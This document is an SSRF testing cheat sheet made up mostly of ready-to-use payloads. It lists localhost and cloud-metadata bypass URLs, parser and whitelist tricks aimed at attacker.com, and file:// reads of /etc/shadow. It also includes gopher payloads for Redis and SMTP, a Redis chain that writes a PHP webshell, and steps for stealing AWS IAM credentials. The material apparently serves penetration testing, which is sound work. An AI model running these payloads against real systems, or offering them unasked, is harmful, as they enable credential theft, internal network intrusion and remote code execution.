# Server-Side Request Forgery (SSRF) Testing Methodology

## Quick Reference

**Basic Payloads:**
```
http://127.0.0.1
http://localhost
http://[::1]
http://169.254.169.254  (AWS metadata)
http://internal-host
```

**Localhost Bypass:**
```
http://127.0.0.1
http://127.1
http://0
http://0.0.0.0
http://localhost
http://[::1]
http://[0:0:0:0:0:0:0:1]
```

---

## SSRF Types

### Basic SSRF
Server fetches URL specified by attacker, returns response.

### Blind SSRF
Server makes request but doesn't return response to attacker.

### Partial SSRF
Attacker controls only part of the URL.

---

## Common Vulnerable Parameters

```
url=
uri=
path=
dest=
redirect=
out=
feed=
image=
site=
load=
target=
link=
src=
```

---

## Target Endpoints

### Cloud Metadata Services

**AWS EC2:**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/dynamic/instance-identity/document
```

**AWS IMDSv2 (requires token):**
```bash
# Get token first
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
# Then use token
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```

**Google Cloud:**
```
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id
```
Note: Requires header `Metadata-Flavor: Google`

**Azure:**
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```
Note: Requires header `Metadata: true`

**DigitalOcean:**
```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
```

**Kubernetes:**
```
https://kubernetes.default.svc/
https://kubernetes.default.svc/api/v1/namespaces
```

### Internal Services

```
http://127.0.0.1:22      # SSH
http://127.0.0.1:25      # SMTP
http://127.0.0.1:80      # HTTP
http://127.0.0.1:443     # HTTPS
http://127.0.0.1:3306    # MySQL
http://127.0.0.1:5432    # PostgreSQL
http://127.0.0.1:6379    # Redis
http://127.0.0.1:9200    # Elasticsearch
http://127.0.0.1:27017   # MongoDB
http://127.0.0.1:8080    # Common alt HTTP
http://127.0.0.1:8443    # Common alt HTTPS
http://127.0.0.1:9000    # PHP-FPM
http://127.0.0.1:11211   # Memcached
```

---

## Bypass Techniques

### IP Address Variations

**Localhost alternatives:**
```
http://127.0.0.1
http://127.1
http://127.000.000.001
http://2130706433        # Decimal: 127*256^3 + 0*256^2 + 0*256 + 1
http://0x7f000001        # Hex
http://0177.0.0.1        # Octal
http://0
http://0.0.0.0
http://localhost
http://[::1]
http://[0:0:0:0:0:0:0:1]
http://[::ffff:127.0.0.1]
http://①②⑦.0.0.① (Unicode)
```

**169.254.169.254 alternatives:**
```
http://169.254.169.254
http://2852039166        # Decimal
http://0xa9fea9fe        # Hex
http://0251.0376.0251.0376  # Octal
http://[::ffff:169.254.169.254]
http://169.254.169.254.nip.io
```

### DNS Rebinding

1. Set up DNS that alternates between your IP and internal IP
2. First request resolves to your server (passes validation)
3. Second request resolves to internal IP (actual fetch)

Tools: `rbndr.us`, custom DNS server

### URL Parser Bypass

**Different parsers interpret URLs differently:**

```
http://evil.com@127.0.0.1
http://127.0.0.1#@evil.com
http://127.0.0.1%2523@evil.com
http://127.0.0.1:80@evil.com
http://evil.com\@127.0.0.1
```

**Unicode normalization:**
```
http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ
```

### Protocol Variations

```
http://127.0.0.1
https://127.0.0.1
gopher://127.0.0.1:25/_HELO%20localhost
dict://127.0.0.1:11211/stat
file:///etc/passwd
ftp://127.0.0.1
```

### Redirect-Based Bypass

If the server follows redirects:

1. Create page at `http://attacker.com/redirect`
2. Page returns `302` to `http://169.254.169.254/`
3. Server follows redirect to internal resource

**PHP redirect:**
```php
<?php header("Location: http://169.254.169.254/latest/meta-data/"); ?>
```

### DNS Tricks

**Domains resolving to internal IPs:**
```
http://spoofed.burpcollaborator.net  # Configure to resolve to 127.0.0.1
http://127.0.0.1.nip.io
http://www.127.0.0.1.nip.io
http://127.0.0.1.xip.io
http://localtest.me               # Resolves to 127.0.0.1
http://customer1.app.localhost   # May resolve to 127.0.0.1
```

### Whitelist Bypass

**If domain whitelist exists:**
```
http://allowed.com@127.0.0.1
http://127.0.0.1/allowed.com
http://allowed.com.attacker.com
http://allowedcom.attacker.com
http://allowed.com%00.attacker.com
http://allowed.com%2f%2f127.0.0.1
```

### Port Scanning

```
http://127.0.0.1:22
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:3306
...iterate through common ports
```

Detect open ports by:
- Response time differences
- Error message differences
- Response size differences

---

## Protocol-Specific Attacks

### Gopher Protocol

**Redis command execution:**
```
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$3%0d%0akey%0d%0a$7%0d%0apayload%0d%0a
```

**SMTP:**
```
gopher://127.0.0.1:25/_HELO%20localhost%0d%0aMAIL%20FROM%3A%3Cattacker%40evil.com%3E%0d%0aRCPT%20TO%3A%3Cvictim%40target.com%3E%0d%0aDATA%0d%0aSubject%3A%20Test%0d%0a%0d%0aTest%20body%0d%0a.%0d%0aQUIT
```

**MySQL (unauthenticated):**
```
gopher://127.0.0.1:3306/_<mysql_packet>
```

### File Protocol

```
file:///etc/passwd
file:///etc/shadow
file:///proc/self/environ
file:///proc/self/cmdline
file:///var/log/apache2/access.log
file://C:/Windows/System32/drivers/etc/hosts
```

### Dict Protocol

```
dict://127.0.0.1:11211/stat
dict://127.0.0.1:6379/INFO
```

---

## Blind SSRF Detection

### Out-of-Band Detection

**Using Burp Collaborator:**
```
http://your-id.burpcollaborator.net
```

**Using webhook.site:**
```
http://webhook.site/your-id
```

**DNS-only detection:**
```
http://ssrf-test.your-id.burpcollaborator.net
```

### Time-Based Detection

```
# Fast response = port closed
# Slow response = port open/filtered
# Timeout = different network behavior
http://127.0.0.1:22
http://127.0.0.1:12345
```

---

## Common Vulnerable Functions

### PHP
```php
file_get_contents($url)
fopen($url)
curl_exec($ch)
```

### Python
```python
requests.get(url)
urllib.request.urlopen(url)
```

### Java
```java
new URL(url).openConnection()
HttpClient.newHttpClient().send(...)
```

### Node.js
```javascript
fetch(url)
axios.get(url)
http.get(url)
```

---

## Exploitation Chains

### SSRF to RCE via Redis

1. Confirm Redis on 127.0.0.1:6379
2. Use Gopher to send Redis commands:
   - Write webshell to web directory
   - Modify SSH authorized_keys

```
gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html%0d%0aCONFIG%20SET%20dbfilename%20shell.php%0d%0aSET%20payload%20"<?php%20system($_GET['cmd']);%20?>"%0d%0aSAVE
```

### SSRF to AWS Credential Theft

1. Access metadata endpoint
2. Get IAM role name
3. Get temporary credentials
4. Access AWS services as the instance

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
→ Returns role name: "my-role"
http://169.254.169.254/latest/meta-data/iam/security-credentials/my-role
→ Returns AccessKeyId, SecretAccessKey, Token
```

---

## Verification Checklist

1. **Identify SSRF vector:**
   - [ ] Parameter accepts URL
   - [ ] Server fetches/processes the URL

2. **Test basic localhost access:**
   - [ ] `http://127.0.0.1`
   - [ ] `http://localhost`
   - [ ] Various bypass techniques

3. **Test cloud metadata (if applicable):**
   - [ ] `http://169.254.169.254/`
   - [ ] With required headers

4. **Confirm exploitation:**
   - [ ] Retrieved internal data
   - [ ] Accessed internal service
   - [ ] Out-of-band callback received

5. **Document evidence:**
   - [ ] Response showing internal data
   - [ ] Working payload
   - [ ] Affected endpoint and parameter
